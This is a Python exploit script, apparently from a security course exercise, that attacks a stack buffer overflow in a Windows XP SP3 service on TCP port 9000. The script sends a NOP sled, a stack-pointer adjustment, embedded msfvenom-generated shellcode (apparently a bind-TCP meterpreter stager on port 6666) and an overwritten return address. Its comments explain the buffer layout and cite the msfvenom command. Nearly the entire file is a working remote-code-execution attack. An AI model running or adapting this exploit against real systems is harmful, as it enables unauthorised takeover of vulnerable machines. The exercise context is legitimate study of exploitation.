#!/usr/bin/python

#Written in python

#Part of the exploit-3 in PA with SP3 XP and exploit of the same name which has a different overflow behavior
#in this the program prevents overwrite of anything past the return address.
#Our shellcode cannot come after the ret, but instead precede it. The ret address points to an address lower in memory (Against buffer growth direction)
#We can have nop,shellcode,nop,retaddress

import socket, sys

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((sys.argv[1],9000))

#This instruction is sub esp 3000
adjust="\x81\xEC\x00\x30\x00\x00"
#Nop OPcode is 90
buf="\x90"*96 #ret address is 1036*4 bytes away , 0022F320 is where it begins
#Any address after 0022F320 is fine

# Remember we cannot be smaller than the overflow size, the buffer still needs to overflow
# and overwrite the return address
#ret could be anywhere in the nop sled before the shellcode 0022F320----- -91*4 (lower, as stack grows opposite 0022F324


#There is one other major issue which needs to be addressed, the stack gets overwritten after the overflow.
#The things we stored on the stack get disrupted and the exploit fails
#Solution?
'''
The key is to write somewhere higher in stack (lower memory) , so that it is beyond the current function frame and does not get overwritten. When we do sub esp 2000 , we are shifting the stack pointer else where.
After storing the stack, the code that is overwriting the current area, will now do it at the lower memory (higher up in stack) ( earlier address - 2000). So we are preventing the overwrite, by causing the overwrites to shift by 2000 addresses. 
'''
#0040151B     81EC 00300000  SUB ESP,3000
buf+=adjust

#Payload size is 309 bytes
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
buf += b"\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a\x02\x68"
buf += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x1a\x0a\x89"
buf += b"\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85"
buf += b"\xc0\x75\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68"
buf += b"\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61"
buf += b"\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
buf += b"\xff\xd5\x83\xf8\x00\x7e\x2d\x8b\x36\x6a\x40\x68\x00"
buf += b"\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5"
buf += b"\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff"
buf += b"\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3"
buf += b"\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"





buf+="\x90"*(1036-96-309-len(adjust))

buf+="\x34\xf3\x22\x00"
print(len(buf))




#msfvenom to generate a payload of choice Eg: msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.59.130 LPORT=6666 -f python



sock.send(buf)
sock.close()
